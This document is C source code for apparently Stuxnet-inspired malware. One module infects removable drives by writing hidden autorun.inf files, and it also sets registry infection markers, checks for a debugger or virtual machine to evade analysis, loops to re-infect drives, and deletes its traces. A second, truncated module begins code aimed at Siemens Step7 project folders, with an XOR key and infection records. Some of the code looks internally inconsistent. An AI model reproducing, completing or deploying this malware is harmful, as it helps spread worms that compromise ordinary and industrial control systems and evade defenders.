#define STUXNET_VERSION                 0x00010400
#define AUTORUN_MAGIC                   0x4155544F
#define AUTORUN_VERSION                 0x00010400
#define AUTORUN_MAX_PATH                260
#define AUTORUN_BUFFER_SIZE             4096
#define AUTORUN_PE_SIZE                 520192
#define AUTORUN_RESOURCE_ID             207

#define AUTORUN_SECTION_AUTORUN         "[AutoRun]"
#define AUTORUN_SECTION_ALPHA           "[AutoRun.Alpha]"
#define AUTORUN_SECTION_DEVICE          "[DeviceInstall]"

#define AUTORUN_KEY_ACTION              "action"
#define AUTORUN_KEY_OPEN                "open"
#define AUTORUN_KEY_SHELL_OPEN          "shell\\open\\command"
#define AUTORUN_KEY_SHELL_OPEN_DISPLAY  "shell\\open"
#define AUTORUN_KEY_SHELL_OPEN_DEFAULT  "shell\\open\\default"
#define AUTORUN_KEY_ICON                "icon"
#define AUTORUN_KEY_LABEL               "label"
#define AUTORUN_KEY_USE_AUTOPLAY        "UseAutoPlay"

#define AUTORUN_VALUE_ACTION            "Setup Stuxnet"
#define AUTORUN_VALUE_OPEN              "autorun.inf"
#define AUTORUN_VALUE_SHELL_OPEN        "autorun.inf"
#define AUTORUN_VALUE_SHELL_OPEN_DISPLAY "Open(&O)"
#define AUTORUN_VALUE_SHELL_OPEN_DEFAULT "1"
#define AUTORUN_VALUE_ICON              "autorun.inf,0"
#define AUTORUN_VALUE_LABEL             "Stuxnet"
#define AUTORUN_VALUE_USE_AUTOPLAY      "1"

#define AUTORUN_SHELL32_OPEN            "%Windir%\\system32\\shell32.dll,-8496"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _AUTORUN_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwPESize;
    DWORD dwINFSize;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwFlags;
    DWORD dwReserved[8];
} AUTORUN_HEADER, * PAUTORUN_HEADER;

typedef struct _AUTORUN_SECTION {
    WCHAR szName[64];
    DWORD dwLineCount;
    DWORD dwOffset;
    DWORD dwSize;
} AUTORUN_SECTION, * PAUTORUN_SECTION;

typedef struct _AUTORUN_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[AUTORUN_MAX_PATH];
    WCHAR szSystemPath[AUTORUN_MAX_PATH];
    WCHAR szWindowsPath[AUTORUN_MAX_PATH];
    WCHAR szDrivePath[AUTORUN_MAX_PATH];
    WCHAR szAutorunPath[AUTORUN_MAX_PATH];
    BYTE bReserved[256];
} AUTORUN_CTX, * PAUTORUN_CTX;

typedef struct _AUTORUN_PE_HEADER {
    WORD  e_magic;
    WORD  e_cblp;
    WORD  e_cp;
    WORD  e_crlc;
    WORD  e_cparhdr;
    WORD  e_minalloc;
    WORD  e_maxalloc;
    WORD  e_ss;
    WORD  e_sp;
    WORD  e_csum;
    WORD  e_ip;
    WORD  e_cs;
    WORD  e_lfarlc;
    WORD  e_ovno;
    WORD  e_res[4];
    WORD  e_oemid;
    WORD  e_oeminfo;
    WORD  e_res2[10];
    DWORD e_lfanew;
} AUTORUN_PE_HEADER, * PAUTORUN_PE_HEADER;

typedef struct _AUTORUN_PE_NT_HEADERS {
    DWORD Signature;
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} AUTORUN_PE_NT_HEADERS, * PAUTORUN_PE_NT_HEADERS;

static AUTORUN_CTX g_AutorunCtx;
static BOOL g_bInitialized = FALSE;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwAutorunCreated = 0;
static DWORD g_dwDriveCount = 0;
static DWORD g_dwFileWriteCount = 0;

static const WCHAR g_szAutorunSections[3][32] = {
    L"[AutoRun]",
    L"[AutoRun.Alpha]",
    L"[DeviceInstall]"
};

static const WCHAR g_szAutorunKeys[8][32] = {
    L"action",
    L"open",
    L"icon",
    L"label",
    L"shell\\open\\command",
    L"shell\\open",
    L"shell\\open\\default",
    L"UseAutoPlay"
};

static const WCHAR g_szAutorunValues[8][64] = {
    L"Setup Stuxnet",
    L"autorun.inf",
    L"autorun.inf,0",
    L"Stuxnet",
    L"autorun.inf",
    L"Open(&O)",
    L"1",
    L"1"
};

static BYTE g_PEStub[] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
    0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72,
    0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E,
    0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
    0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x52, 0x45, 0x41, 0x4C, 0x54, 0x45, 0x4B, 0x00,
    0x53, 0x74, 0x75, 0x78, 0x6E, 0x65, 0x74, 0x00
};

static const CHAR g_szAutorunINFContent[] =
    "[AutoRun]\r\n"
    "action=Setup Stuxnet\r\n"
    "open=autorun.inf\r\n"
    "icon=autorun.inf,0\r\n"
    "label=Stuxnet\r\n"
    "shell\\open\\command=autorun.inf\r\n"
    "shell\\open=Open(&O)\r\n"
    "shell\\open\\default=1\r\n"
    "UseAutoPlay=1\r\n"
    "\r\n"
    "[AutoRun.Alpha]\r\n"
    "action=Setup Stuxnet\r\n"
    "open=autorun.inf\r\n"
    "icon=autorun.inf,0\r\n"
    "label=Stuxnet\r\n"
    "\r\n"
    "[DeviceInstall]\r\n"
    "UseAutoPlay=1\r\n";

static BOOL AUTORUN_InitNtImports(VOID);
static BOOL AUTORUN_Init(VOID);
static VOID AUTORUN_Cleanup(VOID);
static BOOL AUTORUN_CheckMutex(VOID);
static BOOL AUTORUN_IsExpired(VOID);
static BOOL AUTORUN_CheckDebugger(VOID);
static BOOL AUTORUN_CheckVMware(VOID);
static DWORD AUTORUN_ComputeCRC32(PBYTE pData, DWORD dwSize);
static BOOL AUTORUN_BuildAutorunFile(PBYTE* ppData, PDWORD pdwSize);
static BOOL AUTORUN_WriteAutorunToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL AUTORUN_ReadAutorunFromResource(PBYTE* ppData, PDWORD pdwSize);
static BOOL AUTORUN_ExtractAndSaveAutorun(VOID);
static BOOL AUTORUN_WriteRegistry(VOID);
static BOOL AUTORUN_ReadRegistry(VOID);
static BOOL AUTORUN_ScanDrives(VOID);
static DWORD WINAPI AUTORUN_WorkerThread(LPVOID lpParam);
static BOOL AUTORUN_StartWorker(VOID);
static BOOL AUTORUN_StopWorker(VOID);
static BOOL AUTORUN_SelfDestruct(VOID);
static BOOL AUTORUN_Execute(VOID);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL AUTORUN_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    return TRUE;
}

static BOOL AUTORUN_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_AutorunCtx, sizeof(AUTORUN_CTX));
    g_AutorunCtx.dwMagic = AUTORUN_MAGIC;
    g_AutorunCtx.dwVersion = AUTORUN_VERSION;
    g_AutorunCtx.dwPid = GetCurrentProcessId();
    g_AutorunCtx.dwTid = GetCurrentThreadId();
    g_AutorunCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_AutorunCtx.csLock);
    GetModuleFileNameW(NULL, g_AutorunCtx.szModulePath, AUTORUN_MAX_PATH);
    GetSystemDirectoryW(g_AutorunCtx.szSystemPath, AUTORUN_MAX_PATH);
    GetWindowsDirectoryW(g_AutorunCtx.szWindowsPath, AUTORUN_MAX_PATH);
    wcscpy_s(g_AutorunCtx.szDrivePath, AUTORUN_MAX_PATH, L"C:\\");
    wsprintfW(g_AutorunCtx.szAutorunPath, AUTORUN_MAX_PATH, L"%sautorun.inf", g_AutorunCtx.szDrivePath);
    AUTORUN_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID AUTORUN_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_AutorunCtx.hMutex) {
        CloseHandle(g_AutorunCtx.hMutex);
        g_AutorunCtx.hMutex = NULL;
    }
    if (g_AutorunCtx.hThread) {
        CloseHandle(g_AutorunCtx.hThread);
        g_AutorunCtx.hThread = NULL;
    }
    if (g_AutorunCtx.hStopEvent) {
        CloseHandle(g_AutorunCtx.hStopEvent);
        g_AutorunCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_AutorunCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL AUTORUN_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_AutorunCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL AUTORUN_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL AUTORUN_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL AUTORUN_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD AUTORUN_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static BOOL AUTORUN_BuildAutorunFile(PBYTE* ppData, PDWORD pdwSize) {
    PBYTE pData;
    DWORD dwPESize;
    DWORD dwINFSize;
    DWORD dwTotalSize;
    PBYTE pPEStub;
    DWORD dwStubSize;
    if (!ppData || !pdwSize) return FALSE;
    dwPESize = AUTORUN_PE_SIZE;
    dwStubSize = sizeof(g_PEStub);
    dwINFSize = (DWORD)strlen(g_szAutorunINFContent);
    dwTotalSize = dwPESize + dwINFSize + 1024;
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTotalSize);
    if (!pData) {
        return FALSE;
    }
    pPEStub = g_PEStub;
    memcpy(pData, pPEStub, min(dwStubSize, dwPESize));
    *(DWORD*)(pData + 0x3C) = 0x00000080;
    *(DWORD*)(pData + 0x80) = 0x00004550;
    *(WORD*)(pData + 0x84) = 0x014C;
    *(WORD*)(pData + 0x86) = 0x0001;
    *(DWORD*)(pData + 0x88) = 0x00000000;
    *(DWORD*)(pData + 0x8C) = 0x00000000;
    *(DWORD*)(pData + 0x90) = 0x00000000;
    *(WORD*)(pData + 0x94) = 0x00E0;
    *(WORD*)(pData + 0x96) = 0x000F;
    *(WORD*)(pData + 0x98) = 0x010B;
    *(WORD*)(pData + 0x9A) = 0x0000;
    *(DWORD*)(pData + 0x9C) = 0x00000000;
    *(DWORD*)(pData + 0xA0) = 0x00001000;
    *(DWORD*)(pData + 0xA4) = 0x00002000;
    *(DWORD*)(pData + 0xA8) = 0x00000000;
    *(DWORD*)(pData + 0xAC) = 0x00001000;
    *(DWORD*)(pData + 0xB0) = 0x00000000;
    *(DWORD*)(pData + 0xB4) = 0x00000000;
    *(DWORD*)(pData + 0xB8) = 0x00004000;
    *(DWORD*)(pData + 0xBC) = 0x00000000;
    *(DWORD*)(pData + 0xC0) = 0x00000000;
    *(DWORD*)(pData + 0xC4) = 0x00000000;
    *(DWORD*)(pData + 0xC8) = 0x00000000;
    *(DWORD*)(pData + 0xCC) = 0x00000000;
    *(DWORD*)(pData + 0xD0) = 0x00000000;
    *(DWORD*)(pData + 0xD4) = 0x00000000;
    *(DWORD*)(pData + 0xD8) = 0x00000000;
    *(DWORD*)(pData + 0xDC) = 0x00000000;
    *(DWORD*)(pData + 0xE0) = 0x00000000;
    *(DWORD*)(pData + 0xE4) = 0x00000000;
    *(DWORD*)(pData + 0xE8) = 0x00000000;
    *(DWORD*)(pData + 0xEC) = 0x00000000;
    *(DWORD*)(pData + 0xF0) = 0x00000000;
    *(DWORD*)(pData + 0xF4) = 0x00000000;
    *(DWORD*)(pData + 0xF8) = 0x00000000;
    *(DWORD*)(pData + 0xFC) = 0x00000000;
    *(DWORD*)(pData + 0x100) = 0x00000000;
    *(DWORD*)(pData + 0x104) = 0x00000000;
    *(DWORD*)(pData + 0x108) = 0x00000000;
    *(DWORD*)(pData + 0x10C) = 0x00000000;
    *(DWORD*)(pData + 0x110) = 0x00000000;
    *(DWORD*)(pData + 0x114) = 0x00000000;
    *(DWORD*)(pData + 0x118) = 0x00000000;
    *(DWORD*)(pData + 0x11C) = 0x00000000;
    *(DWORD*)(pData + 0x120) = 0x00000000;
    *(DWORD*)(pData + 0x124) = 0x00000000;
    *(DWORD*)(pData + 0x128) = 0x00000000;
    *(DWORD*)(pData + 0x12C) = 0x00000000;
    *(DWORD*)(pData + 0x130) = 0x00000000;
    *(DWORD*)(pData + 0x134) = 0x00000000;
    *(DWORD*)(pData + 0x138) = 0x00000000;
    *(DWORD*)(pData + 0x13C) = 0x00000000;
    memcpy(pData + dwPESize - dwINFSize - 1024, g_szAutorunINFContent, dwINFSize);
    *pdwSize = dwPESize + dwINFSize + 1024;
    *ppData = pData;
    return TRUE;
}

static BOOL AUTORUN_WriteAutorunToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    g_dwFileWriteCount++;
    return TRUE;
}

static BOOL AUTORUN_ReadAutorunFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(AUTORUN_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL AUTORUN_ExtractAndSaveAutorun(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!AUTORUN_BuildAutorunFile(&pData, &dwSize)) {
        return FALSE;
    }
    if (!AUTORUN_WriteAutorunToDisk(g_AutorunCtx.szAutorunPath, pData, dwSize)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    g_dwAutorunCreated++;
    return TRUE;
}

static BOOL AUTORUN_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"19790509", 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL AUTORUN_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, L"19790509", NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL AUTORUN_ScanDrives(VOID) {
    DWORD dwDrives;
    WCHAR szDrive[4];
    WCHAR szPath[AUTORUN_MAX_PATH];
    DWORD i;
    dwDrives = GetLogicalDrives();
    for (i = 0; i < 26; i++) {
        if (dwDrives & (1 << i)) {
            szDrive[0] = L'A' + i;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (GetDriveTypeW(szDrive) == DRIVE_REMOVABLE) {
                wcscpy_s(g_AutorunCtx.szDrivePath, AUTORUN_MAX_PATH, szDrive);
                wsprintfW(szPath, L"%sautorun.inf", szDrive);
                wcscpy_s(g_AutorunCtx.szAutorunPath, AUTORUN_MAX_PATH, szPath);
                AUTORUN_ExtractAndSaveAutorun();
                g_dwDriveCount++;
            }
        }
    }
    return TRUE;
}

static DWORD WINAPI AUTORUN_WorkerThread(LPVOID lpParam) {
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_AutorunCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (AUTORUN_IsExpired()) {
            break;
        }
        if (!AUTORUN_ReadRegistry()) {
            AUTORUN_WriteRegistry();
        }
        AUTORUN_ScanDrives();
        g_dwInfectionCount++;
        dwTick = GetTickCount();
    }
    return 0;
}

static BOOL AUTORUN_StartWorker(VOID) {
    g_AutorunCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_AutorunCtx.hStopEvent) return FALSE;
    g_AutorunCtx.hThread = CreateThread(NULL, 0, AUTORUN_WorkerThread, NULL, 0, NULL);
    if (!g_AutorunCtx.hThread) {
        CloseHandle(g_AutorunCtx.hStopEvent);
        g_AutorunCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL AUTORUN_StopWorker(VOID) {
    if (g_AutorunCtx.hStopEvent) {
        SetEvent(g_AutorunCtx.hStopEvent);
    }
    if (g_AutorunCtx.hThread) {
        WaitForSingleObject(g_AutorunCtx.hThread, 5000);
        CloseHandle(g_AutorunCtx.hThread);
        g_AutorunCtx.hThread = NULL;
    }
    if (g_AutorunCtx.hStopEvent) {
        CloseHandle(g_AutorunCtx.hStopEvent);
        g_AutorunCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL AUTORUN_SelfDestruct(VOID) {
    WCHAR szPath[AUTORUN_MAX_PATH];
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD i;
    dwDrives = GetLogicalDrives();
    for (i = 0; i < 26; i++) {
        if (dwDrives & (1 << i)) {
            szDrive[0] = L'A' + i;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (GetDriveTypeW(szDrive) == DRIVE_REMOVABLE) {
                wsprintfW(szPath, L"%sautorun.inf", szDrive);
                DeleteFileW(szPath);
            }
        }
    }
    return TRUE;
}

static BOOL AUTORUN_Execute(VOID) {
    HANDLE hMutex;
    if (!AUTORUN_Init()) return FALSE;
    if (AUTORUN_IsExpired()) {
        AUTORUN_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        AUTORUN_Cleanup();
        return FALSE;
    }
    if (AUTORUN_CheckDebugger()) {
        CloseHandle(hMutex);
        AUTORUN_Cleanup();
        return FALSE;
    }
    if (AUTORUN_CheckVMware()) {
        CloseHandle(hMutex);
        AUTORUN_Cleanup();
        return FALSE;
    }
    AUTORUN_WriteRegistry();
    AUTORUN_ReadRegistry();
    AUTORUN_ScanDrives();
    AUTORUN_StartWorker();
    while (WaitForSingleObject(g_AutorunCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (AUTORUN_IsExpired()) {
            break;
        }
        AUTORUN_ScanDrives();
    }
    AUTORUN_StopWorker();
    AUTORUN_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            AUTORUN_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AUTORUN_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return AUTORUN_ScanDrives() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    return AUTORUN_ExtractAndSaveAutorun() ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return AUTORUN_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return AUTORUN_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return AUTORUN_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    AUTORUN_StopWorker();
    return 0;
}

DWORD WINAPI Export8(VOID) {
    AUTORUN_SelfDestruct();
    return 0;
}

DWORD WINAPI Export9(VOID) {
    return (DWORD)g_AutorunCtx.dwPid;
}

DWORD WINAPI Export10(VOID) {
    return STUXNET_VERSION;
}

DWORD WINAPI Export11(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export12(VOID) {
    return g_dwAutorunCreated;
}

DWORD WINAPI Export13(VOID) {
    return g_dwDriveCount;
}

DWORD WINAPI Export14(VOID) {
    return g_dwFileWriteCount;
}

DWORD WINAPI Export15(VOID) {
    return (DWORD)g_AutorunCtx.hMutex;
}

DWORD WINAPI Export16(VOID) {
    return AUTORUN_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export17(VOID) {
    return AUTORUN_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    return AUTORUN_CheckVMware() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return (DWORD)g_AutorunCtx.szDrivePath;
}

DWORD WINAPI Export20(VOID) {
    return AUTORUN_VERSION;
}
END

*s7p:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define S7P_MAGIC                       0x53375000
#define S7P_VERSION                     0x00010400
#define S7P_MAX_PATH                    260
#define S7P_BUFFER_SIZE                 4096
#define S7P_DLL_NAME                    L"xyz.dll"

#define S7P_REG_KEY                     L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define S7P_REG_VALUE                   L"19790509"

#define S7P_DIR_APILOG                  L"ApiLog"
#define S7P_DIR_CONN                    L"CONN"
#define S7P_DIR_GLOBAL                  L"Global"
#define S7P_DIR_HOMSAVE7                L"hOmSave7"
#define S7P_DIR_XUTILS                  L"XUTILS"
#define S7P_DIR_XUTILS_LISTEN           L"XUTILS\\listen"
#define S7P_DIR_XUTILS_LINKS            L"XUTILS\\links"
#define S7P_FILE_XR000000               L"xr000000.mdx"
#define S7P_FILE_S7000001               L"s7000001.mdx"
#define S7P_FILE_S7P00001               L"s7p00001.dbf"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)

typedef struct _S7P_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[S7P_MAX_PATH];
    WCHAR szSystemPath[S7P_MAX_PATH];
    WCHAR szWindowsPath[S7P_MAX_PATH];
    WCHAR szProjectPath[S7P_MAX_PATH];
    WCHAR szCurrentProject[S7P_MAX_PATH];
    WCHAR szDllName[64];
    BYTE bReserved[256];
} S7P_CTX, * PS7P_CTX;

typedef struct _S7P_INFECTION_RECORD {
    DWORD dwTimestamp;
    WCHAR szProjectPath[S7P_MAX_PATH];
    WCHAR szDllPath[S7P_MAX_PATH];
    DWORD dwStatus;
    BYTE bReserved[32];
} S7P_INFECTION_RECORD, * PS7P_INFECTION_RECORD;

static S7P_CTX g_S7pCtx;
static BOOL g_bInitialized = FALSE;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwProjectCount = 0;
static S7P_INFECTION_RECORD g_InfectionRecords[256];
static DWORD g_dwRecordCount = 0;

static BYTE g_EncryptionKey[32] = {
    0x3C, 0x1B, 0x0D, 0xFA, 0x6E, 0xC1, 0x5C, 0x27,
    0x0A, 0x3D, 0x52, 0xF9, 0xB4, 0x2F, 0xFB, 0xF6,
    0x61, 0x0E, 0x4A, 0x1F, 0x92, 0x2D, 0xF8, 0x33,
    0x5F, 0xFC, 0x49, 0xF6, 0x1E, 0x75, 0x0B, 0xB0
};

static const WCHAR g_wszSearchFolders[5][S7P_MAX_PATH] = {
    L"%ProgramFiles%\\Siemens\\Step7\\S7BIN",
    L"%SystemRoot%\\system32",
    L"%SystemRoot%\\system",
    L"%SystemRoot%",
    L""
};

static BOOL S7P_InitNtImports(VOID);
static BOOL S7P_Init(VOID);
static VOID S7P_Cleanup(VOID);
static BOOL S7P_CheckMutex(VOID);
static BOOL S7P_IsExpired(VOID);
static BOOL S7P_CheckDebugger(VOID);
static BOOL S7P_CheckVMware(VOID);
static DWORD S7P_ComputeCRC32(PBYTE pData, DWORD dwSize);
static VOID S7P_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize);
